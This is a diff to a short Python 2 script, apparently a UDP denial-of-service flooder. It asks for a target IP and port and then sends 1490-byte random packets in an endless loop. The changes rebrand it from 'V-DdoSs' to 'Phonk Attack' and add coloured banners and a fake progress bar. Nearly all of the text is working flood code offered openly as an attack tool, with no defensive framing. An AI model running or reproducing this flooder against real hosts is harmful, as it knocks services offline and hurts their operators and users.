@@ -1,3 +1,4 @@
+print ("\033[91m")
 import sys
 import os
 import time
@@ -19,18 +20,25 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet V-DdoSs")
+os.system("figlet Phonk <3")
 
-print
+print "Phonk"
+
 ip = raw_input("IP Target : ")
 port = input("Port : ")
+
 os.system("clear")
 
 print("\033[93m")
-os.system("figlet DdoS Attack")
+os.system("figlet Phonk Attack")
+
+print ("\033[92m")
+print "[     ] 0% "
+time.sleep(5)
+print "[     ] 100%"
+time.sleep(3)
 
 sent = 0
-
 while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
